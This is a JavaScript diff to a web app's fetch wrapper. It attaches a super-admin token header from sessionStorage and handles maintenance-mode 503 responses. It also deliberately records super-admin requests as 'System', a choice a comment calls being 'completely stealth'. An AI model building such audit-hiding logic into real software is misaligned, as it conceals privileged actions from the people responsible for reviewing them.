@@ -30,12 +30,30 @@ window.fetch = async function (url, options) {
   
   try {
     let finalUrl = url;
+    if (!options) options = {};
+    const superAdminToken = sessionStorage.getItem('super_admin_token');
+    if (superAdminToken) {
+      if (!options.headers) {
+        options.headers = {};
+      }
+      if (options.headers instanceof Headers) {
+        if (!options.headers.has('x-super-admin-token')) {
+          options.headers.set('x-super-admin-token', superAdminToken);
+        }
+      } else if (Array.isArray(options.headers)) {
+        options.headers.push(['x-super-admin-token', superAdminToken]);
+      } else {
+        options.headers['x-super-admin-token'] = superAdminToken;
+      }
+    }
+
     if (options) {
     const userStr = sessionStorage.getItem('cma_currentUser');
     if (userStr) {
       const user = JSON.parse(userStr);
-      let username = user?.name || user?.username || 'System';
-      if (user?.department) {
+      // If Super Admin, stay completely stealth (record as 'System' rather than revealing superadmin)
+      let username = user?.isSuperAdmin ? 'System' : (user?.name || user?.username || 'System');
+      if (user?.department && !user?.isSuperAdmin) {
         username = `${username} (${user.department})`;
       }
 
@@ -129,6 +147,13 @@ function buildUrl(path, params = {}) {
 }
 
 async function handleResponse(response) {
+  if (response.status === 503) {
+    const body = await response.json().catch(() => ({}));
+    if (body.maintenance) {
+      window.dispatchEvent(new CustomEvent('cma:maintenance-active'));
+      throw new Error(body.error || 'System is currently undergoing maintenance.');
+    }
+  }
   if (!response.ok) {
     const body = await response.json().catch(() => ({}));
     throw new Error(body.error || 'API request failed');
